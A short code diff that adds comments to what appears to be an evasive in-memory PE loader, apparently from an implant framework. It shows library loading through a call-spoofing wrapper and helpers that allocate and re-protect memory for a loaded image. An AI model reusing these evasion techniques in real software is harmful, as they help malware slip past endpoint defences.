@@ -8,6 +8,7 @@ auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
     return (UPTR)Spoof::Call( Instance->Win32.LoadLibraryA, 0, (PVOID)LibName );
 }
 
+// Alloc virtual memory for PE
 auto DECLFN AllocVm( HANDLE Handle, PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
     G_INSTANCE
 
@@ -23,6 +24,7 @@ auto DECLFN AllocVm( HANDLE Handle, PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size
     }
 }
 
+// define memory protections
 auto DECLFN ProtVm( HANDLE Handle, PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
     G_INSTANCE
 
@@ -32,6 +34,7 @@ auto DECLFN ProtVm( HANDLE Handle, PVOID* Address, SIZE_T* Size, ULONG NewProt, 
 
     return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
 }
+
 
 auto DECLFN FixTls(
     _In_ PVOID Base,
